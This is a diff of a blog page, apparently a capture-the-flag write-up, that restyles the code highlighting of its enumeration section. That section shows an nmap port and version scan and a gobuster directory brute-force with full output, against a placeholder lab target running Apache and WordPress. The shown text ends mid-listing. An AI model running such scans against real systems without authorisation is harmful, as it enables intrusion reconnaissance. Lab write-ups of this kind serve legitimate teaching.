@@ -92,8 +92,8 @@
             <span class="logo__text">(virtualtack@github)-[~] $ </span>
             <span class="logo__cursor" style=
                   "
-                   background-color:#46A69D;
-                   animation-duration:1.6s;">
+                   background-color:#6495ed;
+                   animation-duration:2s;">
             </span>
         
     </div>
@@ -114,11 +114,6 @@
                     </svg>
                 </span>
             
-                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
-   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
- </svg></span>
         </span>
     </span>
 </header>
@@ -160,156 +155,156 @@
 <p>I have replaced all instances of the virtual machine&rsquo;s ip address with <code>&lt;target-ip&gt;</code> throughout this write-up.</p>
 <h2 id="methodology">Methodology</h2>
 <p>We begin our enumeration efforts by running an <code>nmap</code> scan on the target machine to understand the ports that are open to network traffic. I usually begin with the TCP SYN &ldquo;Stealth&rdquo; Scan (-sS) with &ldquo;version dection&rdquo; (<code>-V</code>) enabled. Here is a <a href="https://nmap.org/book/port-scanning-options.html">list of general <code>nmap</code> CLI flags</a>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nmap sudo nmap -sV -v &lt;target-ip&gt;
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-05-10 12:12 EDT
-</span></span><span class="line"><span class="cl">NSE: Loaded <span class="m">45</span> scripts <span class="k">for</span> scanning.
-</span></span><span class="line"><span class="cl">Initiating Ping Scan at 12:12
-</span></span><span class="line"><span class="cl">Scanning &lt;target-ip&gt; <span class="o">[</span><span class="m">4</span> ports<span class="o">]</span>
-</span></span><span class="line"><span class="cl">Completed Ping Scan at 12:12, 0.19s elapsed <span class="o">(</span><span class="m">1</span> total hosts<span class="o">)</span>
-</span></span><span class="line"><span class="cl">Initiating Parallel DNS resolution of <span class="m">1</span> host. at 12:12
-</span></span><span class="line"><span class="cl">Completed Parallel DNS resolution of <span class="m">1</span> host. at 12:12, 0.01s elapsed
-</span></span><span class="line"><span class="cl">Initiating SYN Stealth Scan at 12:12
-</span></span><span class="line"><span class="cl">Scanning &lt;target-ip&gt; <span class="o">[</span><span class="m">1000</span> ports<span class="o">]</span>
-</span></span><span class="line"><span class="cl">Discovered open port 443/tcp on &lt;target-ip&gt;
-</span></span><span class="line"><span class="cl">Discovered open port 80/tcp on &lt;target-ip&gt;
-</span></span><span class="line"><span class="cl">Completed SYN Stealth Scan at 12:12, 9.83s elapsed <span class="o">(</span><span class="m">1000</span> total ports<span class="o">)</span>
-</span></span><span class="line"><span class="cl">Initiating Service scan at 12:12
-</span></span><span class="line"><span class="cl">Scanning <span class="m">2</span> services on &lt;target-ip&gt;
-</span></span><span class="line"><span class="cl">Completed Service scan at 12:13, 12.92s elapsed <span class="o">(</span><span class="m">2</span> services on <span class="m">1</span> host<span class="o">)</span>
-</span></span><span class="line"><span class="cl">NSE: Script scanning &lt;target-ip&gt;.
-</span></span><span class="line"><span class="cl">Initiating NSE at 12:13
-</span></span><span class="line"><span class="cl">Completed NSE at 12:13, 2.82s elapsed
-</span></span><span class="line"><span class="cl">Initiating NSE at 12:13
-</span></span><span class="line"><span class="cl">Completed NSE at 12:13, 1.27s elapsed
-</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> &lt;target-ip&gt;
-</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.15s latency<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
-</span></span><span class="line"><span class="cl">PORT    STATE  SERVICE  VERSION
-</span></span><span class="line"><span class="cl">22/tcp  closed ssh
-</span></span><span class="line"><span class="cl">80/tcp  open   http     Apache httpd
-</span></span><span class="line"><span class="cl">443/tcp open   ssl/http Apache httpd
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
-</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 27.44 seconds
-</span></span><span class="line"><span class="cl">           Raw packets sent: <span class="m">2007</span> <span class="o">(</span>88.284KB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">10</span> <span class="o">(</span>416B<span class="o">)</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap sudo nmap -sV -v &lt;target-ip&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#000">(</span> https://nmap.org <span style="color:#000">)</span> at 2022-05-10 12:12 EDT
+</span></span><span style="display:flex;"><span>NSE: Loaded <span style="color:#1c01ce">45</span> scripts <span style="color:#a90d91">for</span> scanning.
+</span></span><span style="display:flex;"><span>Initiating Ping Scan at 12:12
+</span></span><span style="display:flex;"><span>Scanning &lt;target-ip&gt; <span style="color:#000">[</span><span style="color:#1c01ce">4</span> ports<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>Completed Ping Scan at 12:12, 0.19s elapsed <span style="color:#000">(</span><span style="color:#1c01ce">1</span> total hosts<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span>Initiating Parallel DNS resolution of <span style="color:#1c01ce">1</span> host. at 12:12
+</span></span><span style="display:flex;"><span>Completed Parallel DNS resolution of <span style="color:#1c01ce">1</span> host. at 12:12, 0.01s elapsed
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 12:12
+</span></span><span style="display:flex;"><span>Scanning &lt;target-ip&gt; <span style="color:#000">[</span><span style="color:#1c01ce">1000</span> ports<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 443/tcp on &lt;target-ip&gt;
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on &lt;target-ip&gt;
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 12:12, 9.83s elapsed <span style="color:#000">(</span><span style="color:#1c01ce">1000</span> total ports<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span>Initiating Service scan at 12:12
+</span></span><span style="display:flex;"><span>Scanning <span style="color:#1c01ce">2</span> services on &lt;target-ip&gt;
+</span></span><span style="display:flex;"><span>Completed Service scan at 12:13, 12.92s elapsed <span style="color:#000">(</span><span style="color:#1c01ce">2</span> services on <span style="color:#1c01ce">1</span> host<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span>NSE: Script scanning &lt;target-ip&gt;.
+</span></span><span style="display:flex;"><span>Initiating NSE at 12:13
+</span></span><span style="display:flex;"><span>Completed NSE at 12:13, 2.82s elapsed
+</span></span><span style="display:flex;"><span>Initiating NSE at 12:13
+</span></span><span style="display:flex;"><span>Completed NSE at 12:13, 1.27s elapsed
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#a90d91">for</span> &lt;target-ip&gt;
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#000">(</span>0.15s latency<span style="color:#000">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#1c01ce">997</span> filtered tcp ports <span style="color:#000">(</span>no-response<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE  SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp  closed ssh
+</span></span><span style="display:flex;"><span>80/tcp  open   http     Apache httpd
+</span></span><span style="display:flex;"><span>443/tcp open   ssl/http Apache httpd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#a90d91">done</span>: <span style="color:#1c01ce">1</span> IP address <span style="color:#000">(</span><span style="color:#1c01ce">1</span> host up<span style="color:#000">)</span> scanned in 27.44 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#1c01ce">2007</span> <span style="color:#000">(</span>88.284KB<span style="color:#000">)</span> | Rcvd: <span style="color:#1c01ce">10</span> <span style="color:#000">(</span>416B<span style="color:#000">)</span>
 </span></span></code></pre></div><p>From this, we learn that an <code>Apache</code> instance is active on the standard ports, while an ssh server is running on port 22 - though it is closed to network traffic.</p>
 <p>Next, we use <code>gobuster</code>, <a href="https://github.com/OJ/gobuster">a popular tool</a> that facilitates brute-force enumeration. Here, we use it in directory mode (<code>dir</code>) with a popular directory names wordlist (<code>-w</code>) against our <code>&lt;target-ip&gt;</code> with (<code>-u</code>).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gobuster dir -w /usr/share/wordlists/dirb/common.txt -u &lt;target-ip&gt;
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
-</span></span><span class="line"><span class="cl">Gobuster v3.1.0
-</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://&lt;target-ip&gt;
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
-</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
-</span></span><span class="line"><span class="cl">2022/05/10 12:13:27 Starting gobuster in directory enumeration <span class="nv">mode</span>
-</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 213<span class="o">]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 218<span class="o">]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 218<span class="o">]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/0                    <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/0/<span class="o">]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/admin                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 235<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/admin/<span class="o">]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/atom                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/feed/atom/<span class="o">]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/audio                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 235<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/audio/<span class="o">]</span>  
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/blog                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 234<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/blog/<span class="o">]</span>   
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 233<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/css/<span class="o">]</span>    
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/dashboard            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/wp-admin/<span class="o">]</span> 
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/favicon.ico          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>                                      
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/feed                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/feed/<span class="o">]</span>     
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/image                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/image/<span class="o">]</span>    
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/Image                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/Image/<span class="o">]</span>    
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 236<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/images/<span class="o">]</span> 
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1188<span class="o">]</span>                                   
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/index.php            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/<span class="o">]</span>          
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/intro                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 516314<span class="o">]</span>                                 
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 232<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/js/<span class="o">]</span>     
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/license              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 309<span class="o">]</span>                                    
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/login                <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/wp-login.php<span class="o">]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/page1                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/<span class="o">]</span>            
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/phpmyadmin           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 94<span class="o">]</span>                                       
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/readme               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 64<span class="o">]</span>                                       
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/rdf                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/feed/rdf/<span class="o">]</span>   
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/robots               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 41<span class="o">]</span>                                       
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/robots.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 41<span class="o">]</span>                                       
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/rss                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/feed/<span class="o">]</span>       
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/rss2                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/feed/<span class="o">]</span>       
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/sitemap              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>                                        
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/sitemap.xml          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>                                        
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/video                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 235<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/video/<span class="o">]</span>    
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/wp-admin             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 238<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/wp-admin/<span class="o">]</span> 
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/wp-content           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 240<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/wp-content/<span class="o">]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/wp-includes          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 241<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/wp-includes/<span class="o">]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/wp-cron              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>                                          
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/wp-config            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>                                          
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/wp-links-opml        <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 227<span class="o">]</span>                                        
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/wp-load              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>                                          
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/wp-login             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2613<span class="o">]</span>                                       
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/wp-mail              <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 3064<span class="o">]</span>                                       
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/wp-settings          <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>                                          
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/wp-signup            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/wp-login.php?action<span class="o">=</span>register<span class="o">]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/xmlrpc               <span class="o">(</span>Status: 405<span class="o">)</span> <span class="o">[</span>Size: 42<span class="o">]</span>                                                       
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/xmlrpc.php           <span class="o">(</span>Status: 405<span class="o">)</span> <span class="o">[</span>Size: 42<span class="o">]</span>                                                       
-</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
-</span></span><span class="line"><span class="cl">2022/05/10 12:24:21 <span class="nv">Finished</span>
-</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -w /usr/share/wordlists/dirb/common.txt -u &lt;target-ip&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.1.0
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#000">(</span>@TheColonial<span style="color:#000">)</span> &amp; Christian Mehlmauer <span style="color:#000">(</span>@firefart<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">[</span>+<span style="color:#000">]</span> Url:                     http://&lt;target-ip&gt;
+</span></span><span style="display:flex;"><span><span style="color:#000">[</span>+<span style="color:#000">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#000">[</span>+<span style="color:#000">]</span> Threads:                 <span style="color:#1c01ce">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">[</span>+<span style="color:#000">]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span><span style="color:#000">[</span>+<span style="color:#000">]</span> Negative Status codes:   <span style="color:#1c01ce">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">[</span>+<span style="color:#000">]</span> User Agent:              gobuster/3.1.0
+</span></span><span style="display:flex;"><span><span style="color:#000">[</span>+<span style="color:#000">]</span> Timeout:                 <span style="color:#000">10s</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">===============================================================</span>
+</span></span><span style="display:flex;"><span>2022/05/10 12:13:27 Starting gobuster in directory enumeration <span style="color:#000">mode</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">===============================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/.hta                 <span style="color:#000">(</span>Status: 403<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 213<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/.htaccess            <span style="color:#000">(</span>Status: 403<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 218<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/.htpasswd            <span style="color:#000">(</span>Status: 403<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 218<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/0                    <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/0/<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/admin                <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 235<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/admin/<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/atom                 <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/feed/atom/<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/audio                <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 235<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/audio/<span style="color:#000">]</span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/blog                 <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 234<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/blog/<span style="color:#000">]</span>   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/css                  <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 233<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/css/<span style="color:#000">]</span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/dashboard            <span style="color:#000">(</span>Status: 302<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/wp-admin/<span style="color:#000">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/favicon.ico          <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span>                                      
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/feed                 <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/feed/<span style="color:#000">]</span>     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/image                <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/image/<span style="color:#000">]</span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/Image                <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/Image/<span style="color:#000">]</span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/images               <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 236<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/images/<span style="color:#000">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/index.html           <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 1188<span style="color:#000">]</span>                                   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/index.php            <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/<span style="color:#000">]</span>          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/intro                <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 516314<span style="color:#000">]</span>                                 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/js                   <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 232<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/js/<span style="color:#000">]</span>     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/license              <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 309<span style="color:#000">]</span>                                    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/login                <span style="color:#000">(</span>Status: 302<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/wp-login.php<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/page1                <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/<span style="color:#000">]</span>            
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/phpmyadmin           <span style="color:#000">(</span>Status: 403<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 94<span style="color:#000">]</span>                                       
+</span></span><span style="display:flex;"><span>
